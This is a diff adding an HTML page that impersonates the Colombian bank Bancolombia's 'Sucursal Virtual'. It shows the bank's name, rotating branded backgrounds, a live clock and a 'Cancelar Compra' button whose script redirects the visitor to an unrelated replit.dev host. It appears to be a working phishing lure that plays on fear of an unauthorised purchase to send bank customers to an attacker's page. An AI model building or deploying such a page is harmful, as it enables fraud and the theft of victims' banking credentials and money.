@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sucursal Virtual</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-size: cover;
+            background-position: center;
+            font-family: Arial, sans-serif;
+            color: white;
+            text-align: center;
+            position: relative;
+            transition: background-image 1s ease-in-out;
+        }
+
+        .header {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background-color: white;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 20px;
+            box-sizing: border-box;
+            color: black;
+        }
+
+        .header .title {
+            font-size: 20px;
+            margin: 0;
+        }
+
+        .header .datetime {
+            font-size: 14px;
+        }
+
+        .container {
+            background-color: rgba(0, 0, 0, 0.6);
+            padding: 20px;
+            border-radius: 10px;
+            max-width: 90%;
+            box-sizing: border-box;
+        }
+
+        .button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #f1c40f;
+            color: black;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            width: 100%;
+            max-width: 200px;
+        }
+        
+        .button:hover {
+            background-color: #d4ac0d;
+        }
+
+        .small-image-below {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="datetime" id="datetime"></div>
+        <h2 class="title">BANCOLOMBIA</h2>
+    </div>
+
+    <div class="container">
+        <h1>SUCURSAL VIRTUAL</h1>
+        <p>Ingresa al siguiente enlace para continuar:</p>
+        <button class="button" onclick="cancelarCompra()">Cancelar Compra</button>
+        
+        <div class="small-image-below">
+            <img src="log2.png" alt="Imagen pequeña" width="100" height="100">
+        </div>
+    </div>
+
+    <script>
+        function actualizarFechaHora() {
+            const now = new Date();
+            const fecha = now.toLocaleDateString();
+            const hora = now.toLocaleTimeString();
+            document.getElementById('datetime').textContent = `Fecha: ${fecha} - Hora: ${hora}`;
+        }
+
+        actualizarFechaHora();
+        setInterval(actualizarFechaHora, 1000);
+
+        const imagenesDeFondo = ['bnl3.jpg', 'bnl4.png', 'bnl2.png', 'bnl1.jpg', 'bnl5.jpg'];
+        let indiceImagen = 0;
+
+        function cambiarImagenDeFondo() {
+            document.body.style.backgroundImage = `url('${imagenesDeFondo[indiceImagen]}')`;
+            indiceImagen = (indiceImagen + 1) % imagenesDeFondo.length;
+        }
+
+        setInterval(cambiarImagenDeFondo, 5000);
+
+        function cancelarCompra() {
+            window.location.href = 'https://d9eccff6-4e73-4fa5-91a3-77a9bfe72067-00-2bs5xpgt0xa4u.worf.replit.dev/';
+        }
+
+        cambiarImagenDeFondo();
+    </script>
+</body>
+</html>
